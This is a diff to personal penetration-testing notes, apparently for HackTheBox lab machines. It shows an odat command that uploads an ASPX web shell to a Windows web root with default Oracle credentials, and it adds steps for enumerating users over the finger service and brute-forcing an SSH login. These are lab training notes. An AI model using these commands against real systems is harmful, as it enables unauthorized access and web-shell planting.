@@ -88,3 +88,20 @@ Upload shell in oracle:
 
 odat dbmsxslprocessor --sysdba -s 10.10.10.82 -U scott -P tiger -d XE --putFile "C:\\inetpub\\wwwroot\\" "shell1.aspx" "/home/deepak/HTB/Boxes/Silo/shell1.aspx"
 *****************************************************************************************************************************
+
+Finger
+
+Port 79:
+
+Tool for enum users:
+
+http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
+
+Command:
+
+./finger-user-enum.pl -U /usr/share/SecLists/Usernames/Names/names.txt -t 10.129.124.110
+
+You will get some users after running the script, run a bruteforce attack on one of the user and login with ssh:
+
+ssh -p 22022 sunny@10.10.10.76
+*****************************************************************************************************************************
